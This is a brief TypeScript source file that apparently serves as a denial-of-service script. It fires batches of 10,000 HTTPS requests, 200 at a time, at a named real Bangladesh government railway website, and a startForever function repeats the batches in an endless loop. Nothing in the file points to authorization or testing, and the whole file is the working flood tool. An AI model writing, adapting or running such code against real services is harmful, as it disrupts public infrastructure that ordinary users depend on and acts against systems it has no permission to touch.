import https from "https";

const targetUrl = "https://railapp.railway.gov.bd";
const totalRequests = 10000;
const concurrency = 200; // max concurrent requests

function makeRequest(index: number): Promise<void> {
  return new Promise((resolve) => {
    https
      .get(targetUrl, (res: any) => {
        res.on("data", () => {}); // consume data
        res.on("end", () => {
          console.log(`Status: ${res.statusCode} Count: ${index}`);
          resolve();
        });
      })
      .on("error", (err: Error) => {
        console.error(`❌ Error on request ${index}: ${err.message}`);
        resolve();
      });
  });
}

async function runBatch(): Promise<void> {
  let completedRequests = 0;
  let promises: Promise<void>[] = [];

  for (let i = 0; i < totalRequests; i++) {
    promises.push(makeRequest(i));

    if (promises.length >= concurrency) {
      await Promise.all(promises);
      completedRequests += promises.length;
      promises = [];
      console.log(`Completed ${completedRequests} requests so far...`);
    }
  }

  if (promises.length > 0) {
    await Promise.all(promises);
    completedRequests += promises.length;
  }

  console.log(`✅ Completed batch of ${totalRequests} requests.`);
}

export async function startForever(): Promise<void> {
  while (true) {
    await runBatch();
    await new Promise((r) => setTimeout(r, 100));
  }
}


